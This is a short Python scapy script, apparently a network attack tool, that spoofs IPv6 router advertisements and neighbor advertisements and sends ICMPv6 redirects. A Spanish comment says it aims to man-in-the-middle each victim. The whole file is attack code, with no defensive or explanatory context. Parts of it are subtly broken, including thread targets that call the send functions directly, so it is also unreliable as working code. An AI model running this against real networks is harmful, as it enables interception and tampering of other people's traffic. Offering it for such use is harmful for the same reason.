from scapy.all import *
import subprocess
import threading

class FAKE():
        def router(self, dir_6, mac, router, interface):
			subprocess.call(['ip', 'route', 'add', 'default', 'via', '%s' %router, 'dev', '%s' %interface])

			
			for direccion in dir_6:
					conexion = IPv6()
					conexion.dst = direccion
					paquete = ICMPv6ND_RA()
					LLadrs = ICMPv6NDOptSrcLLAddr()
					LLadrs.lladdr = mac
					"""d = ICMPv6NDOptMTU()
					e = ICMPv6NDOptPrefixInfo()
					e.prefixlen = 64
					e.prefix = prefix"""
					send(conexion/paquete/LLadrs)
					

        def NA_router(self, mac, dir_6, dir_6_router):
			ether = (Ether(src = mac))                     
			for direccion in dir_6:
				ipv6 = IPv6(src = direccion, dst = dir_6_router)
				na = ICMPv6ND_NA(tgt = direccion, R=0)
				lla = ICMPv6NDOptDstLLAddr(lladdr=mac)
				threading.Thread(target = sendp(ether/ipv6/na/lla, loop = 1,inter=2)).start()
				continue
				
        def NA_victim(self,mac,dir_6, dir_6_router):
			ether = (Ether(src = mac))
			for direccion in dir_6:
				ipv6 = IPv6(src = dir_6_router, dst = direccion)
				na = ICMPv6ND_NA(tgt = dir_6_router, R=0)
				lla = ICMPv6NDOptDstLLAddr(lladdr=mac)
				threading.Thread(target = sendp(ether/ipv6/na/lla, loop = 1,inter=2)).start()
				continue

class redirect():
		def icmp(self,dir_6,destination):
			for direccion in dir_6: #intentar sacar de aqui len de dir_6 y con eso range(0, eso) crear threads que MITMs a cada victima
				icmp = ICMPv6ND_Redirect()
				icmp.target_ll_addr = direccion
				icmp.redir_hdr = destination
				threading.Thread(target = send(icmp)).start()
				continue
					

